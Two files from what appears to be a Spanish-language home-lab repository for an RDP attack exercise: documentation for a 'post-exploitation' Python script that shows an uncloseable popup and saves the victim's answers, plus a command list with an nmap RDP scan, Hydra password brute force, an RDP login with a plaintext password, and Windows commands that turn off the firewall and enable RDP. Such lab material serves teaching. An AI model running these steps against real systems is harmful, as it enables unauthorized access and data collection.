### **8. `docs/07-ventana-rebelde.md`**

```markdown
# Ventana Rebelde: Script de Post-Explotación

## ¿Qué es?
Un script Python educativo que se ejecuta en la máquina víctima después del ataque para demostrar el control obtenido.

## Código Completo
*[El script está en `scripts/ventana_rebelde.py`]*

## Características
- 🔴 **Ventana emergente** con diseño llamativo
- ❌ **No se puede cerrar** con la X (rebota por la pantalla)
- 📝 **Solicita información** al usuario
- 🔗 **Abre enlace a GitHub** educativamente
- 💾 **Guarda las respuestas** en un archivo de texto

## Ejecución

### En Kali (después de conectarse por RDP)
```bash
python3 ~/Desktop/mis_scripts/ventana_rebelde.py

En Windows (dentro de la sesión RDP)
Copiar el script al escritorio de Windows

Abrir CMD o PowerShell

Ejecutar: python ventana_rebelde.py

Personalización
Elemento	Línea	Cambio posible
Pregunta	61	text="¿Cuál es tu nombre completo?"
Enlace GitHub	85	url = "https://github.com/..."
Colores	9-12	Códigos hex (#2b2b2b, #ff4444)
Velocidad	118	time.sleep(0.01)
Resultado Visual
La ventana aparece en el escritorio de Windows, rebotando por la pantalla, imposibilitando su cierre fácil.



---

### **9. `configuraciones/comandos-utiles.txt`**

```text
# ============================================
# COMANDOS ÚTILES - LABORATORIO CIber Batalla
# ============================================

# === EN KALI LINUX ===

# Ver IP
ip a
ip -4 addr show | grep -oP '(?<=inet\s)\d+(\.\d+){3}'

# Verificar conectividad
ping 192.168.1.106   # Windows
ping 192.168.1.105   # Ubuntu

# Escanear puerto RDP
nmap -p 3389 192.168.1.106

# Ataque Hydra (diccionario)
hydra -l victima -P ~/rockyou.txt -t 1 -W 3 rdp://192.168.1.106

# Ataque Hydra (contraseña específica)
hydra -l victima -p 22675439 rdp://192.168.1.106

# Conectar RDP
xfreerdp3 /v:192.168.1.106 /u:victima /p:22675439 /cert:ignore /dynamic-resolution

# Ejecutar script
python3 ventana_rebelde.py

# === EN WINDOWS (CMD como administrador) ===

# Ver IP
ipconfig

# Habilitar RDP
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

# Desbloquear usuario
net user victima /active:yes

# Desactivar firewall
netsh advfirewall set allprofiles state off

# === EN UBUNTU (opcional) ===

# Ver IP
ip a

# Actualizar sistema
sudo apt update && sudo apt upgrade -y

# Instalar herramientas
sudo apt install wget -y

# Descargar Splunk (si se usa)
wget -O splunk.deb "https://download.splunk.com/products/splunk/releases/9.4.1/linux/splunk-9.4.1-2c0e7b093587-linux-2.6-amd64.deb"

# Instalar Splunk
sudo dpkg -i splunk.deb